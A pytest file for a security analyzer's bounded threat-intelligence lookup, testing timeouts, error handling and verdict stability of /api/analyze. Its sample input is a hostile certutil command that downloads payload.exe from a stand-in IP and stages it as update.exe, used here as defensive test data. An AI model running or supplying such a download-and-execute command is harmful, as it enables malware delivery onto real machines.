"""Remediation Item 5 · Bounded TI-lookup latency (ADR-0010l).

Focused regression coverage for:
  1. `lookup_ti_hits_bounded_meta` returns identical hit list on a fast
     successful lookup and reports `status='ok'` with elapsed_ms < deadline.
  2. Deterministic timeout: when the underlying lookup exceeds the wall-clock
     budget, the wrapper returns `[]` with `status='timeout'` — no fabricated
     hits, no exception raised into the pipeline.
  3. Provider exception is swallowed → `status='error'`, hits = [].
  4. Verdict / MITRE / ATT&CK / risk-score safety: `/api/analyze` risk output
     is byte-identical whether the TI leg succeeds, times out, or errors —
     TI is evidence context, never a verdict driver.
  5. Env var `NIVX_TI_LOOKUP_DEADLINE_MS` is honoured (500 ms default).
"""
from __future__ import annotations
import asyncio
import os
import sys
from pathlib import Path

import pytest

# Guarantee the backend root is on sys.path when pytest is invoked from /app
_BACKEND = Path(__file__).resolve().parents[3]
if str(_BACKEND) not in sys.path:
    sys.path.insert(0, str(_BACKEND))

import analysis_core  # noqa: E402


# ---------------------------------------------------------------------------
# Test 1 · Fast successful lookup preserves shape + reports status 'ok'
# ---------------------------------------------------------------------------
@pytest.mark.asyncio
async def test_bounded_returns_provider_hits_on_success(monkeypatch):
    fake_hits = [
        {"kind": "url", "value": "http://evil.example/x", "source": "local"},
        {"kind": "ip",  "value": "203.0.113.7",           "source": "local"},
    ]

    async def _fast(iocs, layer_iocs=None):
        # Simulate a fast Mongo return.
        await asyncio.sleep(0.001)
        return list(fake_hits)

    monkeypatch.setattr(analysis_core, "lookup_ti_hits", _fast)

    hits, meta = await analysis_core.lookup_ti_hits_bounded_meta(
        {"urls": ["http://evil.example/x"], "ips": ["203.0.113.7"]},
        deadline_s=0.5,
    )
    assert hits == fake_hits
    assert meta["status"] == "ok"
    assert meta["deadline_ms"] == 500.0
    assert 0.0 <= meta["elapsed_ms"] < 500.0


# ---------------------------------------------------------------------------
# Test 2 · Timeout returns [] with status 'timeout' — no fabrication
# ---------------------------------------------------------------------------
@pytest.mark.asyncio
async def test_bounded_returns_empty_on_timeout(monkeypatch):
    async def _slow(iocs, layer_iocs=None):
        # Deliberately exceed the tiny 50 ms budget.
        await asyncio.sleep(1.0)
        return [{"kind": "url", "value": "should_not_appear"}]

    monkeypatch.setattr(analysis_core, "lookup_ti_hits", _slow)

    hits, meta = await analysis_core.lookup_ti_hits_bounded_meta(
        {"urls": ["http://evil.example/x"]},
        deadline_s=0.05,   # 50 ms budget
    )
    assert hits == [], "timeout MUST return an empty list — no fabricated hits"
    assert meta["status"] == "timeout"
    assert meta["deadline_ms"] == 50.0
    # elapsed_ms must at least meet the deadline (the wait actually elapsed).
    assert meta["elapsed_ms"] >= 50.0


# ---------------------------------------------------------------------------
# Test 3 · Provider exception swallowed → status 'error', hits = []
# ---------------------------------------------------------------------------
@pytest.mark.asyncio
async def test_bounded_swallows_provider_exception(monkeypatch):
    async def _boom(iocs, layer_iocs=None):
        raise RuntimeError("mongo unreachable")

    monkeypatch.setattr(analysis_core, "lookup_ti_hits", _boom)

    hits, meta = await analysis_core.lookup_ti_hits_bounded_meta(
        {"urls": ["http://evil.example/x"]},
        deadline_s=0.5,
    )
    assert hits == []
    assert meta["status"] == "error"


# ---------------------------------------------------------------------------
# Test 4 · Convenience wrapper `lookup_ti_hits_bounded` returns list only
# ---------------------------------------------------------------------------
@pytest.mark.asyncio
async def test_bounded_convenience_wrapper_returns_list(monkeypatch):
    async def _fast(iocs, layer_iocs=None):
        return [{"kind": "url", "value": "http://ok/"}]

    monkeypatch.setattr(analysis_core, "lookup_ti_hits", _fast)
    hits = await analysis_core.lookup_ti_hits_bounded({"urls": ["http://ok/"]},
                                                       deadline_s=0.5)
    assert isinstance(hits, list)
    assert hits == [{"kind": "url", "value": "http://ok/"}]


# ---------------------------------------------------------------------------
# Test 5 · Env-var deadline is honoured (default 500 ms)
# ---------------------------------------------------------------------------
def test_deadline_defaults_to_500ms(monkeypatch):
    monkeypatch.delenv("NIVX_TI_LOOKUP_DEADLINE_MS", raising=False)
    assert analysis_core._ti_deadline_seconds() == 0.5


def test_deadline_env_var_override(monkeypatch):
    monkeypatch.setenv("NIVX_TI_LOOKUP_DEADLINE_MS", "1200")
    assert analysis_core._ti_deadline_seconds() == 1.2


def test_deadline_invalid_env_var_falls_back_to_default(monkeypatch):
    monkeypatch.setenv("NIVX_TI_LOOKUP_DEADLINE_MS", "not-a-number")
    assert analysis_core._ti_deadline_seconds() == 0.5


def test_deadline_negative_env_var_falls_back_to_default(monkeypatch):
    monkeypatch.setenv("NIVX_TI_LOOKUP_DEADLINE_MS", "0")
    assert analysis_core._ti_deadline_seconds() == 0.5


# ---------------------------------------------------------------------------
# Test 6 · Verdict/MITRE/risk safety on /api/analyze irrespective of TI status
#
# End-to-end wire test through the LIVE FastAPI route. We patch
# `analysis_core.lookup_ti_hits` under three scenarios and assert the
# risk/mitre/lolbas payload is unchanged across all three. TI status leaks
# into the response only under the `ti_hits` and `ti_lookup_meta` keys.
# ---------------------------------------------------------------------------
@pytest.fixture
def analyze_client(monkeypatch):
    """FastAPI TestClient with auth bypassed to the analyze route."""
    from fastapi.testclient import TestClient
    from server import app
    from deps import get_current_user

    async def _fake_user():
        return {"email": "test@nivxray.com", "role": "admin"}

    app.dependency_overrides[get_current_user] = _fake_user
    try:
        yield TestClient(app)
    finally:
        app.dependency_overrides.pop(get_current_user, None)


_MALICIOUS_INPUT = (
    "certutil.exe -urlcache -split -f "
    "http://203.0.113.15/payload.exe C:\\Users\\Public\\update.exe"
)


def _core_signature(body: dict) -> dict:
    """Reduce /api/analyze response to the verdict-relevant surface — the
    fields that MUST be identical across TI timeout/error/ok."""
    risk = body.get("risk") or {}
    mitre = sorted(
        (m.get("id"), m.get("technique"))
        for m in (body.get("mitre") or []) if isinstance(m, dict) and m.get("id")
    )
    lolbas = sorted(
        l.get("binary") for l in (body.get("lolbas") or [])
        if isinstance(l, dict) and l.get("binary")
    )
    return {
        "verdict":    risk.get("verdict"),
        "level":      risk.get("level"),
        "score":      risk.get("score"),
        "mitre":      mitre,
        "lolbas":     lolbas,
        "corrupt":    body.get("corrupt_payload"),
    }


def test_analyze_verdict_stable_across_ti_ok_timeout_error(analyze_client, monkeypatch):
    """The verdict / risk / MITRE / LOLBAS surface MUST be identical whether
    the TI lookup returns hits, times out, or errors. TI is evidence context,
    never a verdict driver."""
    signatures = {}

    # (a) Successful TI lookup with two synthetic local-cache hits.
    async def _ti_ok(iocs, layer_iocs=None):
        return [
            {"kind": "url", "value": "http://203.0.113.15/payload.exe",
             "source": "local-ti"},
        ]
    monkeypatch.setattr(analysis_core, "lookup_ti_hits", _ti_ok)
    r1 = analyze_client.post("/api/analyze",
                             json={"input": _MALICIOUS_INPUT,
                                   "enrich_osint": False,
                                   "use_ai_verdict": False, "describe": False})
    assert r1.status_code == 200, r1.text
    signatures["ok"] = _core_signature(r1.json())
    assert r1.json()["ti_lookup_meta"]["status"] == "ok"
    assert len(r1.json()["ti_hits"]) >= 1

    # (b) TI leg times out (deadline 50 ms; provider sleeps 1 s).
    monkeypatch.setenv("NIVX_TI_LOOKUP_DEADLINE_MS", "50")

    async def _ti_slow(iocs, layer_iocs=None):
        await asyncio.sleep(1.0)
        return [{"kind": "url", "value": "should_not_appear"}]
    monkeypatch.setattr(analysis_core, "lookup_ti_hits", _ti_slow)
    r2 = analyze_client.post("/api/analyze",
                             json={"input": _MALICIOUS_INPUT,
                                   "enrich_osint": False,
                                   "use_ai_verdict": False, "describe": False})
    assert r2.status_code == 200, r2.text
    signatures["timeout"] = _core_signature(r2.json())
    assert r2.json()["ti_lookup_meta"]["status"] == "timeout"
    assert r2.json()["ti_hits"] == [], "timeout must NEVER fabricate hits"

    # (c) TI leg raises — must be swallowed, `[]` returned.
    monkeypatch.delenv("NIVX_TI_LOOKUP_DEADLINE_MS", raising=False)

    async def _ti_boom(iocs, layer_iocs=None):
        raise RuntimeError("simulated provider failure")
    monkeypatch.setattr(analysis_core, "lookup_ti_hits", _ti_boom)
    r3 = analyze_client.post("/api/analyze",
                             json={"input": _MALICIOUS_INPUT,
                                   "enrich_osint": False,
                                   "use_ai_verdict": False, "describe": False})
    assert r3.status_code == 200, r3.text
    signatures["error"] = _core_signature(r3.json())
    assert r3.json()["ti_lookup_meta"]["status"] == "error"
    assert r3.json()["ti_hits"] == []

    # Assert the verdict-relevant surface is identical across all three runs.
    assert signatures["ok"] == signatures["timeout"] == signatures["error"], (
        f"Verdict surface diverged across TI leg outcomes: {signatures}"
    )


# ---------------------------------------------------------------------------
# Test 7 · /api/analyze completes within a bounded time window when TI stalls
# ---------------------------------------------------------------------------
def test_analyze_wall_clock_bounded_when_ti_stalls(analyze_client, monkeypatch):
    """Regression against the exact failure mode Item-5 targets — a slow TI
    provider must NOT bleed unbounded latency into /api/analyze."""
    import time as _t

    # Tight 100 ms budget on TI, provider deliberately sleeps 3 seconds.
    monkeypatch.setenv("NIVX_TI_LOOKUP_DEADLINE_MS", "100")

    async def _ti_slow(iocs, layer_iocs=None):
        await asyncio.sleep(3.0)
        return []
    monkeypatch.setattr(analysis_core, "lookup_ti_hits", _ti_slow)

    t0 = _t.perf_counter()
    r = analyze_client.post("/api/analyze",
                            json={"input": _MALICIOUS_INPUT,
                                  "enrich_osint": False,
                                  "use_ai_verdict": False, "describe": False})
    elapsed_ms = (_t.perf_counter() - t0) * 1000.0
    assert r.status_code == 200, r.text
    # The route must complete much faster than the 3 s provider sleep would
    # otherwise force. Allow generous headroom (2 s ceiling) for other legs
    # + CI variance; the TI leg itself must not add >~200 ms.
    assert elapsed_ms < 2000.0, (
        f"/api/analyze took {elapsed_ms:.0f} ms — TI stall was not bounded"
    )
    assert r.json()["ti_lookup_meta"]["status"] == "timeout"
